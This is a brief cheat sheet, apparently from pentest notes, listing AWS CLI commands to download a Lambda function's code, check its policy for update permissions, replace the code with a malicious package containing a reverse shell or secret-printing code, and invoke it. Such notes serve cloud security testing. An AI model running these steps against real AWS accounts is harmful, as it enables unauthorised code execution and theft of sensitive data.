# Lambda

### 1) Get function with URL

    aws lambda get-function --function-name arn:aws:lambda:REGION:AWS_ACCOUNT_ID:function:sample-lambda

### 2) Download

    curl "https://GENERATED_URL_FROM_PREVIOUS_COMMAND" --output lambda.zip

### 3) Unzip contents

    unzip lambda.zip

## Insert Malicious Code

Prerequisites: AWS Credentials that have the permissions to do so.

### 1) Check policies in the Lambda function

    aws lambda get-policy --query Policy --output text --function-name arn:aws:lambda:REGION:AWS_ACCOUNT_ID:function:sample-function

#### Interesting findings:

- lambda:UpdateFunctionCode

- lambda:*

### 2) Modify the function with a reverse shell, or print sensitive information.

    aws lambda update-function-code --function-name FUNCTION_NAME --zip-file file://malicious.zip

### 3) Invoke function

    aws lambda invoke --function-name FUNCTION_NAME output.txt
